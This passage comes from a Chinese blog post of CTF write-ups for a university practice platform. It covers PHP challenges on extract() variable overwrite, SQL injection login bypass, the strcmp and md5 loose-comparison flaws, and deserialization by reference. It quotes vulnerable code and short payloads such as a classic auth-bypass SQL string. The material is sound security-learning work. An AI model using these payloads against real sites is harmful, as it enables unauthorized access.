<li><code>md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]</code></li>
</ol>
<p>&#x4E24;&#x79CD;&#x89E3;&#x9898;&#x601D;&#x8DEF;&#xFF1A;</p>
<ol>
<li>&#x7ED9; a&#x3001;b &#x4F20;&#x5165;&#x52A0;&#x5BC6;&#x540E;&#x4EE5; <code>0E</code> &#x5F00;&#x5934;&#x503C;&#xFF0C;<strong>&#x540C;&#xFF1A;1.2 MD5 Collision</strong></li>
<li>&#x7ED9; a&#x3001;b &#x4F20;&#x5165;&#x4E0D;&#x540C;&#x6570;&#x7EC4;&#x4F7F;<code>md5()</code> &#x52A0;&#x5BC6;&#x62A5;&#x9519;&#xFF0C;&#x8FD4;&#x56DE; <code>NULL</code> </li>
</ol>
<h3 id="1-17-&#x53D8;&#x91CF;&#x8986;&#x76D6;"><a href="#1-17-&#x53D8;&#x91CF;&#x8986;&#x76D6;" class="headerlink" title="1.17 &#x53D8;&#x91CF;&#x8986;&#x76D6;"></a>1.17 &#x53D8;&#x91CF;&#x8986;&#x76D6;</h3><p>&#x67E5;&#x770B;&#x5173;&#x952E;&#x90E8;&#x5206;&#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;</span><br><span class="line">                        &lt;?php</span><br><span class="line">                        extract($_POST);</span><br><span class="line">                        if ($pass == $thepassword_123) { ?&gt;</span><br><span class="line">                            &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;?php } ?&gt;</span><br><span class="line">                    &lt;?php } ?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>extract()</code> &#x2013; &#x4ECE;&#x6570;&#x7EC4;&#x4E2D;&#x5C06;&#x53D8;&#x91CF;&#x5BFC;&#x5165;&#x5230;&#x5F53;&#x524D;&#x7684;&#x7B26;&#x53F7;&#x8868;</p>
<p><code>extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) : int</code></p>
<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x7531;&#x4E8E;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E; <code>$flags = EXTR_OVERWRITE</code>&#xFF0C;&#x5F53;&#x6709;&#x51B2;&#x7A81;&#x952E;&#x540D;&#x65F6;&#xFF0C;&#x4F1A;&#x8986;&#x76D6;&#x5DF2;&#x6709;&#x53D8;&#x91CF;&#xFF0C;&#x9020;&#x6210;&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x6F0F;&#x6D1E;</strong></p>
</blockquote>
<p>&#x4FEE;&#x6539; POST &#x8BF7;&#x6C42;&#xFF0C;&#x8986;&#x76D6; <code>$thepassword_123</code> &#x503C;&#xFF0C;&#x4F7F; <code>$pass == $thepassword_123</code> &#x540E;&#x6210;&#x529F;&#x83B7;&#x53D6; flag</p>
<h3 id="1-18-PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;"><a href="#1-18-PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;" class="headerlink" title="1.18 PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;"></a>1.18 PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;</h3><p>Pass ~</p>
<h3 id="1-19-&#x4F2A;&#x88C5;&#x8005;"><a href="#1-19-&#x4F2A;&#x88C5;&#x8005;" class="headerlink" title="1.19 &#x4F2A;&#x88C5;&#x8005;"></a>1.19 &#x4F2A;&#x88C5;&#x8005;</h3><p>&#x5E38;&#x89C1;&#x8BA4;&#x8BC1; IP &#x65B9;&#x5F0F;&#x4E00;&#x628A;&#x68AD;&#x5C31;&#x5B8C;&#x4E8B;&#x4E86;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/header.png" alt="1569030859161"></p>
<h3 id="1-20-Header"><a href="#1-20-Header" class="headerlink" title="1.20 Header"></a>1.20 Header</h3><p>Pass ~</p>
<h3 id="1-21-&#x4E0A;&#x4F20;&#x7ED5;&#x8FC7;"><a href="#1-21-&#x4E0A;&#x4F20;&#x7ED5;&#x8FC7;" class="headerlink" title="1.21 &#x4E0A;&#x4F20;&#x7ED5;&#x8FC7;"></a>1.21 &#x4E0A;&#x4F20;&#x7ED5;&#x8FC7;</h3><p>&#x8FD9;&#x9898;&#x5361;&#x58F3;&#x4E86;&#xFF0C;&#x4E00;&#x76F4;&#x5728;&#x627E; <code>Array ( [0] =&gt; .png [1] =&gt; png )</code> &#x8FD9;&#x4E2A;&#x6570;&#x7EC4;&#x662F;&#x54EA;&#x4E2A;&#x51FD;&#x6570;&#x5904;&#x7406;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x7136;&#x540E;&#x5C31;&#x662F;&#x5404;&#x79CD;&#x5C1D;&#x8BD5;&#x53BB;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x3002;&#x3002;&#x90FD;&#x672A;&#x679C;&#x3002;&#x592A;&#x83DC;&#x4E86;&#xFF0C;upload-labs &#x6211;&#x6765;&#x4E86;</p>
<p><a href="https://findneo.github.io/170924NuptCTFWP/" target="_blank" rel="noopener">&#x5357;&#x4EAC;&#x90AE;&#x7535;&#x5927;&#x5B66;&#x7F51;&#x7EDC;&#x653B;&#x9632;&#x8BAD;&#x7EC3;&#x5E73;&#x53F0;writeup</a></p>
<h3 id="1-22-SQL-&#x6CE8;&#x5165;1"><a href="#1-22-SQL-&#x6CE8;&#x5165;1" class="headerlink" title="1.22 SQL &#x6CE8;&#x5165;1"></a>1.22 SQL &#x6CE8;&#x5165;1</h3><p>&#x67E5;&#x770B;&#x5173;&#x952E;&#x90E8;&#x5206;&#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) {</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) {</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  }</span><br><span class="line">  if($query[user] != &quot;admin&quot;) {</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&#x8981;&#x6C42;&#x4EE5; admin &#x8EAB;&#x4EFD;&#x767B;&#x9646;&#xFF0C;&#x4E07;&#x80FD;&#x5BC6;&#x7801; bypass&#x3002;</p>
<p>payload&#xFF1A;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or 1)<span class="comment">-- abc</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>trim() &#x51FD;&#x6570;&#x7F3A;&#x9677;&#xFF1A;</p>
<ol>
<li>trim &#x51FD;&#x6570;&#x4F1A;&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;&#x4EE5;&#x53CA; <code>\n | \r | \t | \v | \0</code>&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x8FC7;&#x6EE4; <code>\f</code></li>
</ol>
<p>md5() &#x51FD;&#x6570;&#x7F3A;&#x9677;&#xFF1A;</p>
<ol>
<li>&#x5904;&#x7406;&#x54C8;&#x5E0C;&#x5B57;&#x7B26;&#x4E32;&#x65F6;&#xFF0C;&#x5229;&#x7528;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x4EE5; <code>0E</code> &#x5F00;&#x5934;&#x7684;&#x54C8;&#x5E0C;&#x503C;&#x90FD;&#x89E3;&#x91CA;&#x4E3A; <code>0</code></li>
<li>&#x5904;&#x7406;&#x6570;&#x7EC4;&#x65F6;&#x8FD4;&#x56DE; <code>NULL</code></li>
</ol>
</blockquote>
<h3 id="1-23-Pass-check"><a href="#1-23-Pass-check" class="headerlink" title="1.23 Pass check"></a>1.23 Pass check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pass=@$_POST[<span class="string">&apos;pass&apos;</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//&#x88AB;&#x9690;&#x85CF;&#x8D77;&#x6765;&#x7684;&#x5BC6;&#x7801;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1)){</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag:nctf{*}&quot;</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the pass is wrong!&quot;</span>;</span><br><span class="line">}</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;please input pass!&quot;</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>strcmp() &#x51FD;&#x6570;&#x7F3A;&#x9677;&#xFF1A;</strong></p>
<ol>
<li>&#x53C2;&#x6570;&#x4E2D;&#x6709;&#x6570;&#x7EC4;&#x65F6;&#x8FD4;&#x56DE; <code>NULL</code></li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&apos;test&apos;</span>;</span><br><span class="line">$b = [<span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>];</span><br><span class="line">$c = [<span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>];</span><br></pre></td></tr></table></figure>

<p> <img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/Passcheck.png" alt="1569036425703"></p>
<h3 id="1-24-&#x8D77;&#x540D;&#x5B57;&#x771F;&#x96BE;"><a href="#1-24-&#x8D77;&#x540D;&#x5B57;&#x771F;&#x96BE;" class="headerlink" title="1.24 &#x8D77;&#x540D;&#x5B57;&#x771F;&#x96BE;"></a>1.24 &#x8D77;&#x540D;&#x5B57;&#x771F;&#x96BE;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">       $one = ord(<span class="string">&apos;1&apos;</span>);</span><br><span class="line">       $nine = ord(<span class="string">&apos;9&apos;</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       {   </span><br><span class="line">               $digit = ord($number{$i});</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               {</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">               }</span><br><span class="line">       }</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">&apos;54975581388&apos;</span>;</span><br><span class="line">}</span><br><span class="line">$flag=<span class="string">&apos;*******&apos;</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&apos;key&apos;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&apos;access denied&apos;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x904D;&#x5386; <code>$_GET[&apos;key&apos;])</code> &#x7684;&#x53C2;&#x6570;&#x503C;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x5176;&#x4E2D;&#x51FA;&#x73B0; <code>1 - 9</code> &#x7684;&#x6570;&#x5B57;&#xFF0C;&#x5E76;&#x8981;&#x6C42;&#x4F20;&#x5165;&#x7684;&#x503C;&#x7B49;&#x4E8E; <code>54975581388</code> &#x3002;</p>
<p><strong>PHP &#x4E2D;&#x652F;&#x6301;&#x4E0D;&#x540C;&#x8FDB;&#x5236;&#x4E4B;&#x95F4;&#x76F4;&#x63A5;&#x6BD4;&#x8F83;</strong>&#xFF0C;&#x627E;&#x5230;&#x5408;&#x9002;&#x7684;&#x8FDB;&#x5236;&#x8868;&#x793A;&#xFF0C;bypass</p>
<h3 id="1-25-&#x5BC6;&#x7801;&#x91CD;&#x7F6E;"><a href="#1-25-&#x5BC6;&#x7801;&#x91CD;&#x7F6E;" class="headerlink" title="1.25 &#x5BC6;&#x7801;&#x91CD;&#x7F6E;"></a>1.25 &#x5BC6;&#x7801;&#x91CD;&#x7F6E;</h3><p>&#x5206;&#x6790;&#x91CD;&#x7F6E;&#x8BF7;&#x6C42;&#x5305;&#xFF0C;&#x5BFB;&#x627E;&#x8BA4;&#x8BC1;&#x8EAB;&#x4EFD;&#x7684;&#x53C2;&#x6570;&#xFF1A;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/repass.png" alt="1569038550135"></p>
<p>&#x4F2A;&#x9020; admin &#x8EAB;&#x4EFD;&#x8BA4;&#x8BC1;&#xFF0C;&#x91CD;&#x7F6E; admin &#x5BC6;&#x7801;&#x5F97;&#x5230; flag</p>
<p>( PS&#xFF1A;Referer &#x5904;&#x65E0;&#x610F;&#x4E49;</p>
<h3 id="1-26-PHP-&#x53CD;&#x5E8F;&#x5217;&#x5316;-&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;"><a href="#1-26-PHP-&#x53CD;&#x5E8F;&#x5217;&#x5316;-&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;" class="headerlink" title="1.26 PHP &#x53CD;&#x5E8F;&#x5217;&#x5316;(&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;)"></a>1.26 PHP &#x53CD;&#x5E8F;&#x5217;&#x5316;(&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;)</h3><p>pass ~ </p>
<p>&#x54CE;&#xFF0C;&#x7ED9;&#x4E86;&#x6E90;&#x7801;&#xFF0C;&#x9776;&#x673A;&#x4E5F;&#x80FD;&#x6253;&#x5F00;&#xFF0C;&#x7B80;&#x5355;&#x5206;&#x6790;&#x4E00;&#x6CE2;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&apos;pass&apos;</span>])) {</span><br><span class="line">    $pass = $_GET[<span class="string">&apos;pass&apos;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc()){</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($o) {</span><br><span class="line">        $o-&gt;secret = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&apos;t fool me&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x5173;&#x952E;&#x5224;&#x65AD; <code>$o-&gt;secret === $o-&gt;enter</code> </p>
<p>&#x9898;&#x76EE;&#x544A;&#x77E5;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#xFF0C;&#x6CE8;&#x610F;&#x5230;&#x4EE3;&#x7801;&#x7B2C; 14 &#x884C;&#x5BF9;&#x53EF;&#x63A7;&#x53C2;&#x6570; <code>$pass</code> &#x8FDB;&#x884C;&#x4E86; <code>unserialize()</code> &#x64CD;&#x4F5C;</p>
<p>&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x7279;&#x5B9A;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x540E;&#x53D8;&#x91CF; <code>$secret</code> &#x3001;<code>$enter</code> &#x6307;&#x5411;&#x540C;&#x4E00;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF0C;&#x5373;&#x6052;&#x7B49;</p>
<p>payload &#x751F;&#x6210;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> just4fun();</span><br><span class="line">$a-&gt;enter = &amp;$a-&gt;secret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>&#x83B7;&#x5F97;&#x5982;&#x4E0B;&#x4FE1;&#x606F;&#xFF1A;</p>
<p><code>Congratulation! Here is my secret: thisisnctfsecret</code></p>
<p>&#x5C1D;&#x8BD5;&#x63D0;&#x4EA4; flag &#x5931;&#x8D25;</p>
<p>&#x5B9A;&#x662F;&#x54EA;&#x91CC;&#x7684;&#x6253;&#x5F00;&#x65B9;&#x5F0F;&#x4E0D;&#x5BF9;  ( &#x9003; ~</p>
<h3 id="1-27-SQL-Injection"><a href="#1-27-SQL-Injection" class="headerlink" title="1.27 SQL Injection"></a>1.27 SQL Injection</h3><p><code>Ctrl + U</code> &#x83B7;&#x53D6;&#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str){</span><br><span class="line">	if(get_magic_quotes_gpc()){</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	}</span><br><span class="line">	return htmlentities($str, ENT_QUOTES);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1){</span><br><span class="line">	die(&apos;Invalid password!&apos;);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li><code>get_magic_quotes_gpc()</code> &#x2013; &#x67E5;&#x770B;&#x662F;&#x5426;&#x5F00;&#x542F; GPC&#x3002;&#x5F00;&#x542F; : 1 &#xFF1B;&#x5173;&#x95ED; : 0</li>
<li><code>magic_quotes_gpc()</code> &#x2013; &#x4F1A;&#x5C06;&#x5728; GET&#x3001;POST&#x3001;COOKIE &#x53D8;&#x91CF;&#x4E2D;&#x7684;&#x5F15;&#x53F7;&#x3001;&#x53CD;&#x659C;&#x6760;&#x53CA;&#x7A7A;&#x5B57;&#x7B26;&#x8F6C;&#x4E49;&#x3002;PHP5 &#x4E2D;&#x7684; magic_quotes_gpc &#x4E0D;&#x4F1A;&#x8FC7;&#x6EE4; $_SERVER &#x53D8;&#x91CF;&#xFF0C;&#x4F7F;&#x5F97;&#x7C7B;&#x4F3C; client-ip&#x3001;referer &#x4E00;&#x7C7B;&#x7684;&#x6F0F;&#x6D1E;&#x4ECD;&#x80FD;&#x5229;&#x7528;&#x3002;PHP5.4 &#x540E;&#x53D6;&#x6D88;</li>
<li><code>stripslashes()</code> &#x2013; &#x9664;&#x53BB; GPC &#x6DFB;&#x52A0;&#x7684;&#x53CD;&#x659C;&#x6760;</li>
<li><code>htmlentities()</code> &#x2013; &#x5C06;&#x5B57;&#x7B26;&#x8F6C;&#x6362;&#x4E3A; HTML &#x8F6C;&#x4E49;&#x5B57;&#x7B26;</li>
</ol>
</blockquote>
<p>&#x4F9D;&#x65E7;&#x662F;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x7ED5;&#x8FC7;</p>
<p>&#x8F6C;&#x4E49; <code>name=\&apos;&apos;.$username.&apos;\&apos;</code> &#x540E;&#x7F6E;&#x5F15;&#x53F7;&#xFF0C;&#x5728; <code>pass=\&apos;&apos;.$password.&apos;\&apos;</code> &#x4E2D;&#x6784;&#x9020;&#x6C38;&#x771F;&#x5224;&#x65AD;&#x5373;&#x53EF;&#x7ED5;&#x8FC7;</p>
<p>&#x5E26;&#x5165;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5373;&#x4E3A;&#xFF1A;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">&apos;1\&apos; AND pass=&apos;</span> <span class="keyword">or</span> <span class="number">1</span><span class="comment">-- abc&apos;;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-28-&#x7EFC;&#x5408;&#x9898;"><a href="#1-28-&#x7EFC;&#x5408;&#x9898;" class="headerlink" title="1.28 &#x7EFC;&#x5408;&#x9898;"></a>1.28 &#x7EFC;&#x5408;&#x9898;</h3><p>&#x5565;&#x73A9;&#x610F;&#xFF0C;&#x4E22; Console &#x91CC;&#x9762;&#x8DD1;&#x4E00;&#x4E0B;</p>
<p>&#x8F93;&#x51FA; <code>1bc29b36f623ba82aaf6724fd3b16718.php</code> &#xFF0C;&#x6253;&#x5F00;&#x9875;&#x9762;&#x63D0;&#x793A; TIP &#x5728; header &#x5934;&#x91CC;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/zh101.png" alt="1569060138265"></p>
<p><code>TIP: history of bash</code> &#xFF0C;&#x4E00;&#x77AC;&#x95F4;&#x611F;&#x89C9;&#x6709;&#x70B9;&#x61F5;&#x3002;&#x3002;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5417;&#xFF1F;</p>
<p>&#x9042; Google &#x67E5;&#x770B;&#x6709;&#x6CA1;&#x4EC0;&#x4E48;&#x65B0;&#x59FF;&#x52BF;&#xFF0C;&#x61F5;&#x903C;ing &#x2026;</p>
<p>&#x76F4;&#x5230;&#x5728;&#x5EA6;&#x5A18;&#x4E0A;&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x535A;&#x6587;&#xFF1A;<a href="https://www.cnblogs.com/tae44/p/4455747.html" target="_blank" rel="noopener">history&#x4ECB;&#x7ECD;&#x53CA;bash&#x547D;&#x4EE4;&#x5FEB;&#x901F;&#x8C03;&#x7528;</a></p>
<p>&#x5212;&#x91CD;&#x70B9;&#xFF08;<strong>&#x6392;&#x7248;&#x903C;&#x6B7B;&#x5F3A;&#x8FEB;&#x75C7;&#x554A;&#xFF0C;&#x535A;&#x4E3B; &#xFF01;&#xFF01;&#xFF01;</strong>&#xFF09;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/zh102.png" alt="1569061458325"></p>
<p>&#x8BBF;&#x95EE; <code>.bash_history</code> &#xFF1A;&#x663E;&#x793A; <code>zip -r flagbak.zip ./*</code></p>
<p>&#x4E0B;&#x8F7D;&#x89E3;&#x538B;&#xFF0C;Get flag &#xFF01;( &#x83AB;&#x540D;&#x8054;&#x60F3;&#x5230;&#x67D0;&#x535A;&#x5BA2;&#x91CC;&#x9762;&#x4E00;&#x987F;&#x597D;&#x627E;&#x7684; DDCTF &#x67D0;&#x9898; ~</p>
<h3 id="1-29-system&#xFF08;&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;&#xFF09;"><a href="#1-29-system&#xFF08;&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;&#xFF09;" class="headerlink" title="1.29 system&#xFF08;&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;&#xFF09;"></a>1.29 system&#xFF08;&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x505A;&#xFF09;</h3><p>Pass ~</p>
<h3 id="1-30-SQL&#x6CE8;&#x5165;2"><a href="#1-30-SQL&#x6CE8;&#x5165;2" class="headerlink" title="1.30 SQL&#x6CE8;&#x5165;2"></a>1.30 SQL&#x6CE8;&#x5165;2</h3><p>&#x5173;&#x952E;&#x4EE3;&#x7801;&#xFF1A;</p>
